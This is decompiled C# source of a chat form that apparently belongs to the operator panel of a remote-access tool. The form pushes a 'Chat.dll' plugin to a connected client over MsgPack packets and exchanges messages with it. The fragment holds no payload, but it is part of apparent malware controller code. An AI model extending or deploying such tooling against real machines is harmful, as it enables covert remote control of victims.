﻿using System;
using System.ComponentModel;
using System.Drawing;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Server.Algorithm;
using Server.Connection;
using Server.MessagePack;

namespace Server.Forms
{
	// Token: 0x02000091 RID: 145
	public partial class FormChat : Form
	{
		// Token: 0x170000C9 RID: 201
		// (get) Token: 0x06000450 RID: 1104 RVA: 0x0000444B File Offset: 0x0000264B
		// (set) Token: 0x06000451 RID: 1105 RVA: 0x00004453 File Offset: 0x00002653
		public Form1 F { get; set; }

		// Token: 0x170000CA RID: 202
		// (get) Token: 0x06000452 RID: 1106 RVA: 0x0000445C File Offset: 0x0000265C
		// (set) Token: 0x06000453 RID: 1107 RVA: 0x00004464 File Offset: 0x00002664
		internal Clients ParentClient { get; set; }

		// Token: 0x170000CB RID: 203
		// (get) Token: 0x06000454 RID: 1108 RVA: 0x0000446D File Offset: 0x0000266D
		// (set) Token: 0x06000455 RID: 1109 RVA: 0x00004475 File Offset: 0x00002675
		internal Clients Client { get; set; }

		// Token: 0x06000456 RID: 1110 RVA: 0x0000447E File Offset: 0x0000267E
		public FormChat()
		{
			this.InitializeComponent();
		}

		// Token: 0x06000457 RID: 1111 RVA: 0x00029E0C File Offset: 0x0002800C
		private void FormChat_Load(object sender, EventArgs e)
		{
			string text = Interaction.InputBox("TYPE YOUR NICKNAME", "CHAT", "Admin", -1, -1);
			if (string.IsNullOrEmpty(text))
			{
				base.Close();
				return;
			}
			this.Nickname = text;
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Chat.dll");
			ThreadPool.QueueUserWorkItem(new WaitCallback(this.ParentClient.Send), msgPack.Encode2Bytes());
		}

		// Token: 0x06000458 RID: 1112 RVA: 0x00029E98 File Offset: 0x00028098
		private void FormChat_FormClosed(object sender, FormClosedEventArgs e)
		{
			if (this.Client != null)
			{
				try
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "chatExit";
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				}
				catch
				{
				}
			}
		}

		// Token: 0x06000459 RID: 1113 RVA: 0x00029EFC File Offset: 0x000280FC
		private void Timer1_Tick(object sender, EventArgs e)
		{
			try
			{
				if (!this.ParentClient.TcpClient.Connected || !this.Client.TcpClient.Connected)
				{
					base.Close();
				}
			}
			catch
			{
			}
		}

		// Token: 0x0600045A RID: 1114 RVA: 0x00029F48 File Offset: 0x00028148
		private void button1_Click(object sender, EventArgs e)
		{
			if (this.textBox1.Enabled && !string.IsNullOrWhiteSpace(this.textBox1.Text))
			{
				this.richTextBox1.SelectionColor = Color.Green;
				this.richTextBox1.AppendText("ME: \n");
				this.richTextBox1.SelectionColor = Color.Black;
				this.richTextBox1.AppendText(this.textBox1.Text + Environment.NewLine);
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "chatWriteInput";
				msgPack.ForcePathObject("Input").AsString = this.Nickname + ": \n";
				msgPack.ForcePathObject("Input2").AsString = this.textBox1.Text;
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				this.textBox1.Clear();
			}
		}

		// Token: 0x0400035D RID: 861
		private string Nickname = "Admin";
	}
}
